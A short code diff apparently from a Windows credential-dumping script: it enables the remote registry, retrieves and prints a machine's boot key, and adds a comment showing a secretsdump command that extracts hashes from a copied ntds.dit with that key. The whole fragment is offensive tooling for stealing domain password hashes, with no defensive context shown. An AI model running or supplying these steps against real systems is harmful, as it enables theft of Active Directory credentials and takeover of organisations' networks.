@@ -19,3 +19,5 @@ remOps.enableRegistry( )
 bootKey = remOps.getBootKey( )
 print(hexlify(bootKey).decode( ) )
 remOps.finish()
+
+# secretsdump.exe LOCAL -ntds C:\windows\Temp\ntds.dit -bootkey <key>
